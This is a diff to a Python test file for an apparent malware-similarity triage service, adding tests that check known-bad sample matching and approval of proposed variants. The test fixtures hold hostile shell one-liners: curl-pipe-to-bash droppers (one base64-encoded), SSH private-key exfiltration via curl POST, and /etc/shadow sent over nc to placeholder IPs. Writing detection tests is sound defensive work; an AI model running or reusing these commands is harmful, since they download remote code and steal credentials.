@@ -17,6 +17,7 @@ from corpus_lookup import (
     reject_sample,
 )
 from db import new_pool, run_migrations
+from similarity import compare
 import static_triage
 
 
@@ -28,14 +29,20 @@ def pool():
     runtime_url = runtime_url_for_role(admin_url, "verdict_role", "verdict_test_pw")
     run_migrations(admin_url, runtime_url, "migrations")
     p = new_pool(runtime_url)
+
+    # Back to just the migration's seed rows, both before (test_app.py runs
+    # earlier and leaves proposals behind) and after (so later test files see
+    # the same corpus regardless of run order).
+    def reset():
+        with p.connection() as conn:
+            conn.execute(
+                "DELETE FROM known_bad_samples WHERE NOT (content_hash = ANY(%s))",
+                ([hashlib.sha256(c).hexdigest() for _, c in SEED_CORPUS],),
+            )
+
+    reset()
     yield p
-    # Back to just the migration's seed rows, so later test files see the
-    # same corpus regardless of run order.
-    with p.connection() as conn:
-        conn.execute(
-            "DELETE FROM known_bad_samples WHERE NOT (content_hash = ANY(%s))",
-            ([hashlib.sha256(c).hexdigest() for _, c in SEED_CORPUS],),
-        )
+    reset()
     p.close()
 
 
@@ -131,3 +138,33 @@ def test_static_triage_db_error_is_no_match_not_crash(pool, monkeypatch):
     monkeypatch.setattr(static_triage.corpus_lookup, "load_known_bad", boom)
     reasons = static_triage.run(SEED_CORPUS[1][1], pool)
     assert not any("similar" in r for r in reasons)  # YARA may still match, similarity must not
+
+
+def test_new_seeds_match_lightly_modified_variants(pool):
+    corpus = load_known_bad(pool)
+    dropper = b"#!/bin/bash\ncurl -fsSL http://198.51.100.9/stage3.sh | bash\n"
+    exfil = b"#!/bin/bash\ntar czf - ~/.ssh/id_rsa ~/.ssh/id_ed25519 | curl -s -X POST --data-binary @- http://198.51.100.9/up\n"
+    assert compare(dropper, corpus)[0]["label"] == "curl_pipe_dropper"
+    assert compare(exfil, corpus)[0]["label"] == "ssh_key_exfil"
+
+
+def test_proposed_variants_match_only_after_approval(pool):
+    variants = {
+        "base64_dropper": b"#!/bin/bash\necho 'IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vMjAzLjAuMTEzLjcvcCB8IGJhc2gK' | base64 -d | bash\n",
+        "shadow_exfil": b"#!/bin/bash\ncat /etc/shadow | nc 203.0.113.7 9001\n",
+    }
+    renamed = {
+        "base64_dropper": variants["base64_dropper"].replace(b"base64 -d", b"base64 --decode"),
+        "shadow_exfil": variants["shadow_exfil"].replace(b"9001", b"9002"),
+    }
+    hashes = {label: propose_sample(pool, content, label, source="manual")["content_hash"] for label, content in variants.items()}
+
+    for label, content in renamed.items():
+        assert label not in {m["label"] for m in compare(content, load_known_bad(pool))}
+
+    for content_hash in hashes.values():
+        approve_sample(pool, content_hash)
+
+    corpus = load_known_bad(pool)
+    for label, content in renamed.items():
+        assert compare(content, corpus)[0]["label"] == label
